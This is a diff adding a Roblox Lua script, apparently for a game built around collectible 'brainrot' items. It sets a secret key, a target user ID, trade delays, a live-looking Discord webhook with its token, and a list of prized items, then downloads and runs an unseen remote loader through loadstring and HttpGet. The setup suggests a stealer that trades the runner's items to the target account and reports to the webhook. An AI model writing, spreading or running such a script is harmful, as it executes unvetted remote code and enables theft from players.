@@ -1,0 +1,36 @@
+getgenv().SECRET_KEY = "mrr_ffafcbe201064965a058ff2b6d47b669"
+getgenv().TARGET_ID = 9678705087
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1482620567759749312/ASGG2ciAmy2wqd5DIVEbrkzOcVQu377mOCTKbAzL8mh0yEgSYWmtfwle-CPEElZcYECZ"
+getgenv().TARGET_BRAINROTS = {
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Griffin"] = true,
+    ["Nacho Spyder"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Festive 67"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Money Money Puggy"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tictac Sahur"] = true,
+    ["Garama and Madundung"] = true,
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["La Casa Boo"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Cooki and Milki"] = true,
+    ["Ketupat Bros"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Rocco Disco"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Spinny Hammy"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
